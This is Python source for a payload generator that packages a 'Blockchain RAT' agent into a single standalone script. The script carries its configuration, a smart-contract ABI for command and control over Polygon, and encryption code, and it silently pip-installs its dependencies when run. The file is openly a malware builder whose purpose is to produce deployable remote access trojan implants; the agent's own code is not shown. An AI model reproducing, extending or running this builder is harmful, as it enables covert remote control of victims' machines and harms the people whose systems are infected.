"""
Payload Generator V2 - Actually Working Version
Generates truly standalone agent executables
"""

import os
import sys
import json
from pathlib import Path


class PayloadGeneratorV2:
    """Generate working standalone agent payloads"""
    
    def __init__(self):
        self.project_root = Path(__file__).parent.parent
    
    def generate_standalone_agent(self, config, output_path):
        """
        Generate a truly standalone Python agent
        
        Args:
            config: dict with rpc_url, contract_address, private_key, poll_interval
            output_path: where to save the generated agent
        """
        
        # Read the actual module files
        encryption_py = self.project_root / "shared" / "encryption.py"
        blockchain_py = self.project_root / "shared" / "blockchain_client.py"
        agent_py = self.project_root / "agent" / "agent.py"
        abi_json = self.project_root / "shared" / "SessionManager.abi.json"
        
        with open(encryption_py, 'r', encoding='utf-8') as f:
            encryption_code = f.read()
        
        with open(blockchain_py, 'r', encoding='utf-8') as f:
            blockchain_code = f.read()
        
        with open(agent_py, 'r', encoding='utf-8') as f:
            agent_code = f.read()
        
        with open(abi_json, 'r', encoding='utf-8') as f:
            abi_data = f.read()
        
        # Create standalone agent
        standalone = f'''#!/usr/bin/env python3
"""
Blockchain RAT Agent - Standalone Version
Auto-generated standalone agent with embedded configuration
"""

import sys
import os
import json
import time
import subprocess
import platform
from pathlib import Path

# ============================================================================
# AUTO-INSTALLER
# ============================================================================

def check_and_install_dependencies():
    """Check and install required packages"""
    required = {{'web3': '6.11.3', 'eth-account': '0.10.0', 'cryptography': '41.0.7', 'pycryptodome': '3.19.0'}}
    missing = []
    
    for package in required.keys():
        try:
            if package == 'pycryptodome':
                import Crypto
            elif package == 'eth-account':
                import eth_account
            else:
                __import__(package)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[*] Installing dependencies: {{', '.join(missing)}}")
        try:
            packages_to_install = [f"{{pkg}}=={{required[pkg.replace('pycryptodome', 'pycryptodome').replace('eth-account', 'eth-account')]}}" for pkg in missing]
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', '--quiet'] + packages_to_install,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[+] Dependencies installed successfully")
        except:
            print("[!] Auto-install failed. Please run:")
            print("    pip install web3==6.11.3 eth-account==0.10.0 cryptography==41.0.7 pycryptodome==3.19.0")
            sys.exit(1)

# Install dependencies before importing
check_and_install_dependencies()

# Now import dependencies
from web3 import Web3
from eth_account import Account

# ============================================================================
# EMBEDDED CONFIGURATION
# ============================================================================

EMBEDDED_CONFIG = {json.dumps(config, indent=4)}

EMBEDDED_ABI = {abi_data}

# ============================================================================
# EMBEDDED ENCRYPTION MODULE
# ============================================================================

{self._strip_imports(encryption_code)}

# ============================================================================
# EMBEDDED BLOCKCHAIN CLIENT
# ============================================================================

{self._strip_imports_and_fix_abi(blockchain_code)}

# ============================================================================
# AGENT CODE
# ============================================================================

{self._adapt_agent_code(agent_code)}

if __name__ == "__main__":
    main()
'''
        
        # Write to output
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(standalone)
        
        print(f"[+] Standalone agent generated: {{output_path}}")
        return output_path
    
    def _strip_imports(self, code):
        """Remove import statements that will be redefined"""
        lines = code.split('\n')
        filtered = []
        skip_next = False
        
        for line in lines:
            stripped = line.strip()
            
            # Skip module docstring
            if stripped.startswith('"""') or stripped.startswith("'''"):
                if not skip_next:
                    skip_next = True
                    continue
                else:
                    skip_next = False
                    continue
            
            if skip_next:
                continue
            
            # Skip imports that are already imported
            if stripped.startswith('import ') or stripped.startswith('from '):
                if any(x in stripped for x in ['web3', 'eth_account', 'Account', 'Web3', 'cryptography', 'Crypto']):
                    continue
            
            filtered.append(line)
        
        return '\n'.join(filtered)
    
    def _strip_imports_and_fix_abi(self, code):
        """Strip imports and fix ABI loading"""
        code = self._strip_imports(code)
        
        # Replace ABI file loading with embedded ABI
        code = code.replace(
            "with open(abi_path, 'r') as f:\n                abi = json.load(f)",
            "abi = EMBEDDED_ABI"
        )
        code = code.replace(
            "abi_path = Path(__file__).parent / 'SessionManager.abi.json'",
            "# ABI embedded"
        )
        
        return code
    
    def _adapt_agent_code(self, code):
        """Adapt agent code to use embedded config and modules"""
        code = self._strip_imports(code)
        
        # Remove sys.path manipulation
        code = code.replace("sys.path.insert(0, str(Path(__file__).parent.parent))", "# Embedded version")
        
        # Remove shared module imports
        code = code.replace("from shared.blockchain_client import BlockchainClient", "# Embedded")
        code = code.replace("from shared.encryption import EncryptionManager", "# Embedded")
        
        # Replace default config with embedded config
        code = code.replace(
            "return {\n                'rpc_url': 'https://rpc-mumbai.maticvigil.com',",
            f"return EMBEDDED_CONFIG  # {{"
        )
        
        return code


def main():
    """Test the generator"""
    gen = PayloadGeneratorV2()
    
    test_config = {
        'rpc_url': 'https://polygon-rpc.com',
        'contract_address': '0x5031fB08D66ea1181eaE1d89f6E960a4f26c3280',
        'private_key': 'YOUR_AGENT_PRIVATE_KEY_HERE',
        'poll_interval': 10
    }
    
    output = Path(__file__).parent / "test_agent_standalone.py"
    gen.generate_standalone_agent(test_config, output)
    print(f"Test agent generated: {output}")


if __name__ == "__main__":
    main()

